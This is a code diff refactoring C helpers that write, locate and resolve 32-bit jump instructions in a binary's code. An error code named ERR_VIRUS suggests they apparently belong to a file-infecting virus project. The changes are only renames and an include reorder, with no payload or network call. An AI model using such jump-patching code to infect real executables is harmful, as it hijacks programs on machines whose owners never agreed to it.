@@ -1,13 +1,13 @@
 #include <stdint.h>
 #include <stdbool.h>
 #include "disasm.h"
+#include "jumps.h"
 #include "compiler_utils.h"
 #include "errors.h"
-#include "jumps.h"
 
 bool	write_jmp32(struct safe_ptr ref, size_t offset, int32_t value)
 {
-	uint8_t	*jump_opcode = safe(ref, offset, JUMP32_INST_SIZE);
+	uint8_t	*jump_opcode = safe(ref, offset, JMP32_INST_SIZE);
 	int32_t	*jump_value  = (int32_t*)(jump_opcode + 1);
 
 	if (jump_opcode == NULL)
@@ -21,12 +21,12 @@ bool	write_jmp32(struct safe_ptr ref, size_t offset, int32_t value)
 
 bool	write_i32_value(struct safe_ptr ref, size_t offset, int32_t value)
 {
-	void	*jump_value = safe(ref, offset, DWORD);
+	void	*location = safe(ref, offset, DWORD);
 
-	if (jump_value == NULL)
+	if (location == NULL)
 		return errors(ERR_VIRUS, _ERR_V_CANT_READ_JUMP);
 
-	*(int32_t*)(jump_value) = value;
+	*(int32_t*)(location) = value;
 
 	return true;
 }
@@ -44,7 +44,7 @@ void	*find_first_jmp32(struct safe_ptr ref, size_t offset)
 		}
 		if (!known_instruction(code, INSTRUCTION_MAXLEN))
 		{
-			errors(ERR_THROW, _ERR_T_FIND_FIRST_JUMP32);
+			errors(ERR_THROW, _ERR_T_FIND_FIRST_JMP32);
 			goto error;
 		}
 		if (is_jmp32(*code))
@@ -58,7 +58,7 @@ error:
 
 void	*get_jmp32_destination(struct safe_ptr ref, size_t offset)
 {
-	uint8_t	*jump_opcode = safe(ref, offset, JUMP32_INST_SIZE);
+	uint8_t	*jump_opcode = safe(ref, offset, JMP32_INST_SIZE);
 	int32_t	*jump_value  = (int32_t*)(jump_opcode + 1);
 
 	if (jump_opcode == NULL)
@@ -66,5 +66,5 @@ void	*get_jmp32_destination(struct safe_ptr ref, size_t offset)
 		errors(ERR_VIRUS, _ERR_V_CANT_READ_JUMP);
 		return NULL;
 	}
-	return ((jump_opcode + JUMP32_INST_SIZE) + *jump_value);
+	return ((jump_opcode + JMP32_INST_SIZE) + *jump_value);
 }
